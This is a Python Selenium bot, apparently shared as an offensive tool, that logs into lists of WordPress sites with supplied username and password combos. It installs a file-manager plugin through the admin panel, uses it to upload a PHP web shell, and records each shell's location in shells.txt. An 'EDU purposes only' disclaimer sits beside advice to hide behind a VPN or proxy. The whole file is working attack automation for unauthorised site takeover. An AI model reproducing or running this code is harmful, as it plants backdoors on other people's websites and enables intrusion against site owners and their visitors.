from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from sys import argv
import multiprocessing
import random
from selenium.webdriver.support.ui import WebDriverWait
import time
from sys import exit
from selenium.webdriver.common.by import By
import os.path
from selenium.webdriver.support import expected_conditions as EC
from time import strftime
from selenium.webdriver import ActionChains
import pyautogui
from selenium.webdriver.chrome.options import Options
import threading

''' 
Programmed by Z3NTL3 for EDU purposes only
Contact: SavageDevs.net

I am not responsable for any illegal usage.
Do not forget to connect to a VPN or Proxy before starting this BOT

BY Z3NTL3
'''
pyautogui.FAILSAFE = False
class Browser():
    def __init__(self): 
        self.opt = webdriver.ChromeOptions()
        self.opt.add_experimental_option('excludeSwitches', ['enable-logging'])
        self.obj = webdriver.Chrome(
            options=self.opt
        )
    def Driver(self):
        return self.obj

    @staticmethod
    def SiteList(*, prompted_list):
        with open(f'{prompted_list}','r')as f:
            sites = f.read().strip(' ').split('\n')
        return sites

    @staticmethod
    def SitesAmount(*, prompted_list):
        with open(f'{prompted_list}','r')as f:
            sites = f.read().strip(' ').split('\n')
        return len(sites)

    @staticmethod
    def UserPass(*, prompted_list):
        with open(f'{prompted_list}','r')as f:
            userpass = f.read().strip(' ').split('\n')
        return userpass

    @staticmethod
    def ShellLocation(*,url):
        url = url
        baseURL,login = url.split('wp-login.php')
        shell_location = f'{baseURL}wp-content/plugins/ubh/b4tm4n.php'
        return shell_location

    @staticmethod
    def CrazyFormatUserPass(*,prompted_list):   
        with open(f'{prompted_list}','r')as f:
            blabla = f.read().strip(' ').split('\n') 
        urlbroo = blabla

        jetoch = []

        for urls in urlbroo:
            baseurl, loginwp = urls.split('wp-login.php')
            url = loginwp.replace("@",":")
            juisteformat = url.replace("#",'')
            jetoch.append(juisteformat)
        return jetoch

    @staticmethod
    def CrazyFormatSites(*,prompted_list):    
        with open(f'{prompted_list}','r')as f:
            blabla = f.read().strip(' ').split('\n') 
        urlbroo = blabla
        sites = []

        for urls in urlbroo:
            baseurl, loginwp = urls.split('wp-login.php')
            sites.append(f'{baseurl}/wp-login.php')
            
        return sites
    
        
    

class XPATH():
    def __init__(self, time,xpath):
        self.xpath = WebDriverWait(driver, time).until(EC.visibility_of_element_located((By.XPATH, xpath)))
    
    def XPATH_OBJ(self):
        return self.xpath

class ID():
    def __init__(self, time,id):
        self.id = WebDriverWait(driver, time).until(EC.visibility_of_element_located((By.ID, id)))
    
    def ID_OBJ(self):
        return self.id

class LINK_TEXT():
    def __init__(self, time,link):
        self.id = WebDriverWait(driver, time).until(EC.visibility_of_element_located((By.LINK_TEXT, link)))
    
    def LINK_TEXT_OBJ(self):
        return self.id
        
class Click():
    def __init__(self, image):
        self.obj = pyautogui.locateOnScreen(f'bot_photos\\{image}')
        self.clicker = pyautogui.click(self.obj)
        self.double = pyautogui.doubleClick(self.obj)
    def Position_Image(self):
        return self.clicker
    def DoubleClick(self):
        return self.double


CURRENT_TIME = strftime('[%D] %H:%M:%S')
# Z3NTL3
FILEMANAGER = os.path.abspath(f"ubh.zip")
ALPHA_SHELL = os.path.abspath(f"upshell.zip")

def Run(*, site_list, username,passwords,timeout = 10):
    '''
    All start's here
    '''
    
    print()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mStarting on: {site_list}\033[0m")
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUser:Pass = {username}:{passwords}\033[0m")
    
    print()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to Start on: {site_list}\033[0m")
    try:
        driver.get(f'{site_list}/wp-login.php')
    except:
        return print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mInvalid website: {site_list}\033[0m")
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mBot Connected...\033[0m")
    

    try:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find WP Login Form TAGS \033[0m")
        XPATH(timeout, "//form[@id='loginform']").XPATH_OBJ()   
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mCannot find WP Login Form \033[0m")
        return driver.quit()

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mFound WP-LoginForm\033[0m")
    try:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find username input field \033[0m")
        ID(timeout, "user_login").ID_OBJ().send_keys(f'{username}')
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mParsed Username DATA\033[0m")
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mCannot find Username Field WP \033[0m")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find password field\033[0m")
    
    try:
        ID(timeout, "user_pass").ID_OBJ().send_keys(f'{passwords}')
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mCannot find password input field \033[0m")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mParsed PASS DATA")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find WP Submit Button\033[0m")
    
    try:
        ID(timeout, "wp-submit").ID_OBJ().click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mCannot find WP Submit Button \033[0m")
        return driver.quit()

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mClicked WP-SUBMIT")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find Plugins Button\033[0m")
    
    try:
        WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.PARTIAL_LINK_TEXT, 'Plugins'))).click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mI do not have access into plugins")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mLocated to Plugins")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to Plugins > Install Button\033[0m")
    try:
        XPATH(timeout, "//a[@href='plugin-install.php']").XPATH_OBJ().click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mI do not have access into adding plugins")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mLocated to plugin installer")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find upload button\033[0m")
    
    try:
        XPATH(timeout, "//span[@class='upload']").XPATH_OBJ().click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mI do not have access to upload plugins")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mParsed File Manager Into SEARCH")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to upload {FILEMANAGER}\033[0m")
    try:
        XPATH(timeout, "//input[@id='pluginzip']").XPATH_OBJ().send_keys(f'{FILEMANAGER}')
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTimeout while trying to uploading UBH: {FILEMANAGER}")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mInstalling FileManager Plugin on:\033[32m", site_list)
    print('\033[0m')

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to submit {FILEMANAGER} upload\033[0m")
    try:
        XPATH(timeout, "//input[@id='install-plugin-submit']").XPATH_OBJ().click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTimeout occured while submitting the plugin uplod")
        return driver.quit()
    
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find Activate Button\033[0m")
    
    try:
        WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.PARTIAL_LINK_TEXT, 'Activate Plugin'))).click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mCannot find Activate Plugins button")
        return driver.quit()

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mActivated the plugin\033[0m")
    
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find UBH\033[0m")
    try:
        WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.PARTIAL_LINK_TEXT, 'UBH'))).click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mCannot access UBH Location")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mLocated into UBH-CSU BANGLA\033[0m")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find UBH Uploader\033[0m")
    try:
        WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.PARTIAL_LINK_TEXT, 'File Uploader'))).click()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mCannot locate into UBH Uploader")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mLocated into UBH File Uploader\033[0m")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to find BODY TAG\033[0m")
    try:
        WebDriverWait(driver, timeout).until(EC.visibility_of_element_located((By.TAG_NAME, 'body')))
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUBH did not load properly")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mHTML BODY LOADED\033[0m\033[0m")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTrying to Uploading via UBH\033[0m\033[0m")
    #Click('upload.png').Position_Image()
    try:
        WebDriverWait(driver, timeout).until(
            lambda loaded: 'File Uploader' in loaded.title
        )
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUBH Loader did not load properly")
        return driver.quit()

    time.sleep(2)
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling mouse to select\033[0m\033[0m")
    try:
        Click('ubhselecht.png').Position_Image()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mSelected\033[0m\033[0m")

    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling mouse to desktop\033[0m\033[0m")
    time.sleep(0.5)
    try:
        Click('desktop.png').Position_Image()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling Mouse to XPLOIT\033[0m\033[0m")
    time.sleep(0.5)
    try:
        Click('exploit.png').DoubleClick()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mControlling mouse to AK74 SHELL\033[0m\033[0m")
    time.sleep(0.5)
    try:
        Click('ak.png').DoubleClick()
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mSHELL UPLOADED\033[0m\033[0m")
    time.sleep(0.5)
    try:
        Click('ubhup.png').Position_Image()
        time.sleep(0.5)
    except:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have configured \'bot_photos\' wrong read our docs for correct usage")
        return driver.quit()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mNavigating to XPLOIT SHELL\033[0m\033[0m")
    
   
    shellloc = Browser.ShellLocation(url=site_list)
    
    with open('shells.txt','a+')as f:
        f.write(f"Shell Uploaded To: {shellloc}\n")
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mAll SHELLS UPLOADED at {shellloc} and is saved on \'shells.txt\'\033[0m\033[0m")
    print()
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mSuccessfully bypassed and \033[32mXPLOITED\033[0m the SERVER\033[0m\033[0m")
    
    
'''
if amount < 1:
    print(LOGO)
    exit('\033[31mMinimum 1 website in sites.txt\033[0m')
'''
LOGO = """
 {}╔═╗╔═╗╔╗╔╔╦╗╦  ╔═╗  
 {}╔═╝║╣ ║║║ ║ ║  ║╣   
 {}╚═╝╚═╝╝╚╝ ╩ ╩═╝╚═╝  
  {}WP Exploit Shell
   {}Shell Upload
       {}BOT

 {}by Z3NTL3 (Efdal).{}
 Contact: SavageDevs.net

{}CTRL {}+ {}C\033[0m to {}stop\033[0m
""".format(
    '\033[38;5;205m',
'\033[38;5;206m',
'\033[38;5;207m',
'\033[38;5;219m',
'\033[38;5;207m',
'\033[38;5;219m',
'\033[38;5;207m',
'\033[\033[38;5;219m',
'\033[0m',
'\033[38;5;207m',
'\033[38;5;219m',
'\033[38;5;207m',
'\033[\033[38;5;219m'
)


if __name__ == '__main__':
    print(LOGO)      
    pyautogui.alert(text="While using WP-XPL0IT use a fast proxy or VPN connection",title="Confirmation")
    print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mAwaiting Prompt\033[0m\033[0m")
    beSURE = pyautogui.alert(text="Do not forget to change the screenshots of /bot_photos to how your PC files looks!", title="PLEASE README")
    fileloc = pyautogui.prompt(text="Site list file.txt location:", title="Site List Filename: ", default='')
    

    if fileloc == None:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have pressed cancel\033[0m\033[0m")
        exit(0)
    else:
        pass

    if os.path.exists(f'{fileloc}'):
        pass
    else:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mThe file {fileloc} does not exist in the current directory\033[0m\033[0m")
        pyautogui.alert(text=f'The file {fileloc} does not exist in the current DIRECTORY', title='Error', button='OK')
        exit(0)

    invalid_amount_sites = False

    if Browser.SitesAmount(prompted_list=str(fileloc)) < 1:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mEnter minimum 1 or more websites in your file it has: {Browser.SitesAmount()}\033[0m\033[0m")
        pyautogui.alert(text=f'Your file has only {Browser.SitesAmount()} site in it minimum is 1 or more', title='Error', button='OK')
        exit(0)
    else:
        pass

    invalid_sites = False
    for check_err in Browser.SiteList(prompted_list=str(fileloc)):
        if 'http://' not in check_err == True or 'https://' not in check_err == True:
            invalid_sites = True
            break
        
    if invalid_sites == True:
        print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mThe file {fileloc} does not have correct formatting\033[0m\033[0m")
        pyautogui.alert(text=f'Please enter current format in your {fileloc}', title='Error', button='OK')
        exit(0)
    else:
        pass

    question = pyautogui.confirm(text='Choose', title='Choose FORMATTING', buttons=['Default', 'Revshow'])

    if question == 'Default':
        userpass = pyautogui.prompt(text="user:pass list", title="USER:PASS COMBOS", default='')
        
        if userpass == None:
            print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou have pressed cancel\033[0m\033[0m")
            exit(0)
        else:
            pass
        
        timeout = pyautogui.prompt(title='Choose Timeout', text='How Long Should I Wait for the site to respond in seconds', default='')
        try:
            timeout = int(timeout)
        except:
            print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTimeout can only be a number not letters or chars\033[0m\033[0m")
            exit(0)
        if os.path.exists(f'{userpass}'):
            pass
        else:
            print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mThe file {userpass} does not exist in the current directory\033[0m\033[0m")
            exit(0)
        
        for check_slice in Browser.UserPass(prompted_list=f'{userpass}'):
            if ":" not in check_slice:
                print(f"\033[38;5;205m[ \033[38;5;207mSYSTEM: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYour file {userpass} has invalid formatting! user:pass only per line\033[0m\033[0m")
                exit(0)

        userpassLIST = Browser.UserPass(prompted_list=f'{userpass}')
        sitelist = Browser.SiteList(prompted_list=str(fileloc))
        for WPXPLOIT in zip(userpassLIST,sitelist):
            try:
                print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mLoaded {Browser.SitesAmount(prompted_list=str(fileloc))} websites\033[0m\033[0m")
                user,password = WPXPLOIT[0].split(':')
                driver = Browser().Driver()
                driver.set_window_size(1100, 1080)
                th = threading.Thread(target=Run(site_list=f'{WPXPLOIT[1]}', username=f'{user}',passwords=f'{password}'))
                th.daemon = True
                th.start()
                th.join() 
            except KeyboardInterrupt:
                print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou pressed CTRL + C meaning me to EXIT\033[0m\033[0m")
                exit(0)
            except:
                print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUserPass Formatting not valid\033[0m\033[0m")
        print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mAll Sites Have been Scanned\033[0m\033[0m")

    elif question == 'Revshow':
        timeout = pyautogui.prompt(title='Choose Timeout', text='How Long Should I Wait for the site to respond in seconds', default='')
        try:
            timeout = int(timeout)
        except:
            print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mTimeout can only be a number not letters or chars\033[0m\033[0m")
            exit(0)
        RevShow_Format_USERPASS = Browser.CrazyFormatUserPass(prompted_list=f'{fileloc}')
        RevShow_Format_SITES = Browser.CrazyFormatSites(prompted_list=f'{fileloc}')

        for WPXPLOIT in zip(RevShow_Format_SITES,RevShow_Format_USERPASS):
            try:
                sites = WPXPLOIT[0]
                username,passwd = WPXPLOIT[1].split(':')

            
                print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mLoaded {Browser.SitesAmount(prompted_list=str(fileloc))} websites\033[0m\033[0m")
                driver = Browser().Driver()
                driver.set_window_size(1920, 1080)
                th = threading.Thread(target=Run(site_list=f'{sites}', username=f'{username}',passwords=f'{passwd}', timeout=10))
                th.daemon = True
                th.start()
                th.join() 
            except KeyboardInterrupt:
                print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mYou pressed CTRL + C meaning me to EXIT\033[0m\033[0m")
                exit(0)
            except:
                print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mUserPass Formatting not valid\033[0m\033[0m")
                
    print(f"\033[38;5;205m[ \033[38;5;207mSTARTING: \033[38;5;219m{strftime('[%D] %H:%M:%S')} \033[38;5;205m] \033[38;5;207mAll Sites Have been Scanned\033[0m\033[0m")
            
